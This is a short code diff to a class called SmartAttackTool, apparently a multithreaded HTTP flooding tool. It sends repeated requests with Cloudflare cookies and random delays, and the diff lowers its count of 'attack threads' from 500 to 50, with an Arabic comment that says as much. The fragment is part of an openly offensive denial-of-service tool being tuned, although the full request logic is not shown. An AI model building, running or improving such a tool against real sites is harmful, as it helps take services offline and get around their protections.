@@ -73,8 +73,8 @@ class SmartAttackTool:
                 self._smart_request(url, cf_cookies)
                 time.sleep(random.uniform(0.5, 2))
 
-        # بدء 500 خيط هجومي
-        for _ in range(500):
+        # بدء 50 خيط هجومي
+        for _ in range(50):
             t = threading.Thread(target=attacker)
             t.daemon = True
             t.start()
